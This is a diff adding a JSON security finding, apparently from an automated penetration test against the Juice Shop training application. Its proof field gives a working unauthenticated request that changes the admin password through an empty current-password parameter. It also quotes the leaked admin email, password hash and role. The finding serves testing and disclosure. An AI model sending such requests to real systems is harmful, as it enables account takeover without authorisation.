@@ -1,0 +1,10 @@
+{
+  "title": "Unauthenticated admin account takeover via empty-current-password in /rest/user/change-password",
+  "location": "/rest/user/change-password",
+  "severity": "critical",
+  "proof": "GET /rest/user/change-password?current=&new=admin123&repeat=admin123 (anon, no session) returns: {\"user\":{\"id\":1,\"email\":\"admin@juice-sh.op\",\"password\":\"0192023a7bbd73250516f069df18b500\",\"role\":\"admin\",...}} and changes admin password. Login then succeeds with the new password, returning admin JWT token.",
+  "stage": "class_probe",
+  "precondition": "",
+  "affected_actor": "",
+  "affected_resource": ""
+}
